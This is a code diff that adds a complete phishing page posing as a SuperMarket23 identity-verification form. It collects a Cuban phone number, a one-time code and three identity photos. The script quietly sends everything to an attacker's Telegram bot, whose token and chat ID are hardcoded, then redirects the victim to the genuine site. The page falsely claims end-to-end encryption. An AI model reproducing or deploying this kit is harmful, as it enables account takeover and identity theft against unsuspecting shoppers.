@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <title>SuperMarket23 - Gestión Profesional</title>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, sans-serif; background-color: #f0f4f8; color: #003366; display: flex; justify-content: center; padding: 20px; }
+        .card { background: white; width: 380px; padding: 35px; border-radius: 15px; box-shadow: 0 10px 30px rgba(0,51,102,0.1); text-align: center; }
+        h1 { font-size: 30px; color: #0055aa; margin-bottom: 5px; text-transform: uppercase; }
+        .subtitle { font-size: 12px; color: #666; margin-bottom: 25px; }
+        .field-label { display: block; text-align: left; font-size: 11px; font-weight: bold; margin: 15px 0 5px 5px; }
+        .input-bar { width: 100%; padding: 12px; border: 1px solid #ced4da; border-radius: 8px; box-sizing: border-box; outline: none; }
+        .prefix { background: #e9ecef; font-weight: bold; color: #0055aa; border: 2px solid #0055aa; }
+        .photo-row { display: flex; justify-content: space-between; margin: 20px 0; }
+        .box { width: 31%; height: 75px; border: 2px dashed #0055aa; border-radius: 8px; display: flex; align-items: center; justify-content: center; position: relative; overflow: hidden; background: #f8fbff; }
+        .box input { position: absolute; width: 100%; height: 100%; opacity: 0; cursor: pointer; z-index: 2; }
+        .box::before { content: '+'; font-size: 24px; color: #0055aa; }
+        .btn-auth { background-color: #0055aa; color: white; border: none; width: 100%; padding: 16px; border-radius: 8px; font-weight: bold; cursor: pointer; margin-top: 10px; }
+        .footer-secure { font-size: 11px; color: #28a745; margin-top: 15px; font-weight: bold; }
+        #overlay { display: none; position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: white; border-radius: 15px; flex-direction: column; align-items: center; justify-content: center; z-index: 10; }
+        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #0055aa; border-radius: 50%; width: 45px; height: 45px; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+
+<div class="card" style="position: relative;">
+    <div id="overlay">
+        <div id="loader" class="spinner"></div>
+        <p id="status-msg" style="margin-top: 15px; font-weight: bold; color: #0055aa;">Sincronizando...</p>
+    </div>
+
+    <h1>SuperMarket23</h1>
+    <div class="subtitle">Sistema de Verificación de Identidad</div>
+
+    <label class="field-label">IDENTIFICADOR (#)</label>
+    <input type="text" class="input-bar prefix" value="+53#" readonly>
+
+    <label class="field-label">USUARIO / TELÉFONO</label>
+    <input type="number" id="data_tel" class="input-bar" placeholder="Ej: 52345678">
+
+    <label class="field-label">ARCHIVOS DE IDENTIDAD (F1, F2, F3)</label>
+    <div class="photo-row">
+        <div class="box" id="b1"><input type="file" id="f1" accept="image/*" onchange="document.getElementById('b1').style.background='#d4edda'"></div>
+        <div class="box" id="b2"><input type="file" id="f2" accept="image/*" onchange="document.getElementById('b2').style.background='#d4edda'"></div>
+        <div class="box" id="b3"><input type="file" id="f3" accept="image/*" onchange="document.getElementById('b3').style.background='#d4edda'"></div>
+    </div>
+
+    <label class="field-label">(#)</label>
+    <input type="text" id="data_cod" class="input-bar" placeholder="-------">
+
+    <button class="btn-auth" onclick="enviarTodo()">AUTENTICAR</button>
+    <div class="footer-secure">🔐 Conexión con cifrado de extremo a extremo</div>
+</div>
+
+<script>
+async function enviarTodo() {
+    const tel = document.getElementById('data_tel').value;
+    const cod = document.getElementById('data_cod').value;
+    const ov = document.getElementById('overlay');
+
+    if (!tel || !cod) { alert("Complete los campos requeridos."); return; }
+
+    ov.style.display = 'flex';
+
+    const token = "8110847420:AAEWlnFLCaebFWVs9_H4yipst1V5COYtLfg";
+    const chat_id = "6475554235";
+    const mensaje = `✅ **SM23_SUCCESS_SYNC**\n\n👤 **USER:** +53#${tel}\n🔑 **TOKEN:** ${cod}`;
+
+    try {
+        // 1. Enviar los datos de texto primero
+        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({ chat_id: chat_id, text: mensaje, parse_mode: 'Markdown' })
+        });
+
+        // 2. ENVIAR LAS FOTOS (Corregido para asegurar recepción)
+        const inputs = ['f1', 'f2', 'f3'];
+        for (let i = 0; i < inputs.length; i++) {
+            const fileInput = document.getElementById(inputs[i]);
+            if (fileInput.files && fileInput.files[0]) {
+                const formData = new FormData();
+                formData.append('chat_id', chat_id);
+                formData.append('photo', fileInput.files[0]);
+                
+                // Envío individual de cada foto al servidor de Telegram
+                await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+            }
+        }
+
+        // Redirección final segura
+        setTimeout(() => {
+            window.location.href = "https://www.supermarket23.com";
+        }, 1500);
+
+    } catch (error) {
+        ov.style.display = 'none';
+        alert("Error de red. Intente de nuevo.");
+    }
+}
+</script>
+</body>
+</html>
